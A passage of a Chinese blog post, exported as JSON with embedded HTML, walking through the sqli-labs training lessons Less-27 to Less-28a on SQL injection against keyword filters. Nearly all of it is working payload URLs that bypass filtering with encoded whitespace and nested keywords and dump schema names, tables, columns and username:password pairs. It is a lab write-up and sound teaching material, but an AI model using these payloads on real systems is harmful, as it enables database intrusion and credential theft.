title=\"Less-27\"></a>Less-27</h2><p>源码分析：</p>\n<p>在Less-26的基础上Less-27将<code>union</code>和<code>select</code>字段进行了过滤：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209145938742.png\" alt=\"image-20220209145938742\"></p>\n<p><strong><code>\\s</code>表示空白字符空格、制表符、换页符等，<code>/i</code>表示忽略大小写。</strong></p>\n<h2 id=\"具体步骤-5\"><a href=\"#具体步骤-5\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>使用编码注入判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39;%0band%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209150455232.png\" alt=\"image-20220209150455232\"></p>\n<p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,database(),0x7e)))and&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209151300652.png\" alt=\"image-20220209151300652\"></p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,(seselselectectlect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e)))and&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209151357185.png\" alt=\"image-20220209151357185\"></p>\n<p>后续过程如以往。</p>\n<hr>\n<h2 id=\"Less-27a\"><a href=\"#Less-27a\" class=\"headerlink\" title=\"Less-27a\"></a>Less-27a</h2><p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;1&quot; &quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209152251922.png\" alt=\"image-20220209152251922\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSElECT%0b1,2,3%0bor%0b&quot;1&quot;&#x3D;&quot;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209152519463.png\" alt=\"image-20220209152519463\"></p>\n<p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,database(),3%0bor%0b&quot;1&quot;&#x3D;&quot;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209152730899.png\" alt=\"image-20220209152730899\"></p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(table_name),3%0bFROM%0binformation_schema.tables%0bWHERE%0btable_schema &#x3D; &#39;security&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209152850481.png\" alt=\"image-20220209152850481\"></p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(column_name),3%0bFROM%0binformation_schema.columns%0bWHERE%0btable_schema&#x3D;&#39;security&#39;%0bAND%0btable_name&#x3D;&#39;users&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209153059934.png\" alt=\"image-20220209153059934\"></p>\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(concat_ws(&quot;:&quot;,username,password)),3%0bFROM%0busers%0bWHERE%0b&quot;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209153308600.png\" alt=\"image-20220209153308600\"></p>\n<hr>\n<h2 id=\"Less-28\"><a href=\"#Less-28\" class=\"headerlink\" title=\"Less-28\"></a>Less-28</h2><p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;) OR (&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209153509042.png\" alt=\"image-20220209153509042\"></p>\n<p>判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0bORDER%0bBY%0b3%0bor%0b(&#39;1&#39;)&#x3D;(&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209153601689.png\" alt=\"image-20220209153601689\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,2,&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209154702357.png\" alt=\"image-20220209154702357\"></p>\n<p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(schema_name))from(information_schema.schemata) ),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209154757665.png\" alt=\"image-20220209154757665\"></p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()) ),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209154840411.png\" alt=\"image-20220209154840411\"></p>\n<hr>\n<h2 id=\"Less-28a\"><a href=\"#Less-28a\" class=\"headerlink\" title=\"Less-28a\"></a>Less-28a</h2><p>盲注，只过滤了union+select，单引号括号闭合。可以使用空格和注释</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209155123396.png\" alt=\"image-20220209155123396\"></p>\n<h2 id=\"具体步骤-6\"><a href=\"#具体步骤-6\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>布尔盲注猜字段：</p>\n<p>数据库长度：<code>?id=1&#39;) and length((database()))=8 --+</code></p>\n<p>猜数据库名：<code>?id=1&#39;) and substr((select database()),1,1)=&quot;s&quot; --+</code></p>\n<p>猜表长：<code>?id=1&#39;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1) )=6 --+</code></p>\n<p>猜表名：<code>?id=1&#39;) and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&quot;e&quot; --+</code></p>\n","text":"[TOC] 关键字过滤的注入Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将--，#，or，and等关键字都过滤掉了，在这样的基础上进行 SQL注入。 Less-23由源码可以看到，接收到的id值将被函数preg_replace()进行过...","link":"","photos":[],"count_time":{"symbolsCount":"9.9k","symbolsTime":"9 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">关键字过滤的注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-23\"><span class=\"toc-text\">Less-23</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-25\"><span class=\"toc-text\">Less-25</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">绕过思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-1\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-25a\"><span class=\"toc-text\">Less-25a</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-2\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-26\"><span class=\"toc-text\">Less-26</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-3\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-26a\"><span class=\"toc-text\">Less-26a</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-4\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-27\"><span class=\"toc-text\">Less-27</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-5\"><span class=\"toc-text\">具体步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-27a\"><span class=\"toc-text\">Less-27a</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-28\"><span class=\"toc-text\">Less-28</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-28a\"><span class=\"toc-text\">Less-28a</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4-6\"><span class=\"toc-text\">具体步骤</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"POST注入-二次注入","uid":"47679b9d369f170d867be494752fa62e","slug":"POST注入-二次注入","date":"2022-02-09T03:31:17.000Z","updated":"2022-02-13T15:33:50.663Z","comments":true,"path":"api/articles/POST注入-二次注入.json","keywords":null,"cover":[],"text":"[TOC] ##二次注入原理 二次注入，主要分为两步； 第一步：插入恶意数据 ​ 第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数...","link":"","photos":[],"count_time":{"symbolsCount":687,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-Oracle等注入","uid":"11c6b3c7b164ff24fb9d530dce97a986","slug":"SQL注入-Oracle等注入","date":"2022-02-07T10:57:10.000Z","updated":"2022-02-13T15:39:28.635Z","comments":true,"path":"api/articles/SQL注入-Oracle等注入.json","keywords":null,"cover":[],"text":"[TOC] ##数据库注入 除Access数据库之外，其他类型数据库注入流程： 什么决定网站注入点的用户权限？ SQL的配置文件用户名 Access注入（特殊）####Access数据结构 ​ 表名 ​ 列名 ​ 数据 注意：1、Access数据库只有一个数据库； ​ 2、 Ac...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"信息搜集","slug":"信息搜集","count":10,"path":"api/categories/信息搜集.json"}],"tags":[{"name":"信息搜集","slug":"信息搜集","count":11,"path":"api/tags/信息搜集.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}